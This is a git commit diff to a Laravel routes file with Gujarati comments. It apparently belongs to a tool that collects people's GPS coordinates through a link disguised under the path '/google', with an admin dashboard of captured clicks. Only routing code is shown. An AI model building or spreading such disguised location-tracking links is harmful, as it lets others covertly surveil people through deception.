83b4e1b7e68233234c69b2e404abeb31385ea788
Gaurav Patoliya <gauravpatoliya19@gmail.com>
2026-04-19 18:00:55 +0530

    Update web.php

--- routes/web.php
+++ routes/web.php
@@ -3,24 +3,25 @@
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\TrackController;
 
-// મેઈન પેજ
+// ૧. મેઈન હોમ પેજ
 Route::get('/', function () {
-    return "App Working";
+    return view('welcome'); // અથવા "App Working"
 });
 
-// ૧. ટ્રેકિંગ માટેનો રૂટ
-// યુઝર આ લિંક ખોલશે એટલે TrackController નો track ફંક્શન લોડિંગ પેજ બતાવશે
+// ૨. ટ્રેકિંગ લિંક (આ લિંક યુઝરને મોકલવી)
+// આ રૂટ TrackController@track પર જશે અને ત્યાંથી loading.blade.php બતાવશે
 Route::get('/google', [TrackController::class, 'track'])->name('track');
 
-// ૨. GPS લોકેશન અપડેટ કરવા માટેનો નવો રૂટ (નવી ફિક્સ)
-// આ રૂટ JavaScript (AJAX) દ્વારા ડેટા લેવા માટે વપરાશે
+// ૩. GPS ડેટા અપડેટ કરવા માટે (AJAX POST)
+// જ્યારે યુઝર 'Allow' આપશે ત્યારે JavaScript આ રૂટ પર Latitude/Longitude મોકલશે
 Route::post('/update-location', [TrackController::class, 'updateLocation'])->name('location.update');
 
-// ૩. ડેશબોર્ડ રૂટ
+// ૪. એડમિન ડેશબોર્ડ
 Route::get('/dashboard', [TrackController::class, 'dashboard'])->name('dashboard');
 
-// ૪. સિંગલ રેકોર્ડ ડિલીટ કરવા માટે
+// ૫. સિંગલ રેકોર્ડ ડિલીટ કરવા માટે
 Route::delete('/click/delete/{id}', [TrackController::class, 'destroy'])->name('click.delete');
 
-// ૫. બધો જ ડેટા એકસાથે ડિલીટ કરવા માટે
+// ૬. બધો જ ડેટા એકસાથે ડિલીટ કરવા માટે
+// આપણે Controller માં truncate() વાપર્યું છે, જે આ રૂટ દ્વારા ટ્રિગર થશે
 Route::delete('/clicks/delete-all', [TrackController::class, 'destroyAll'])->name('clicks.deleteall');
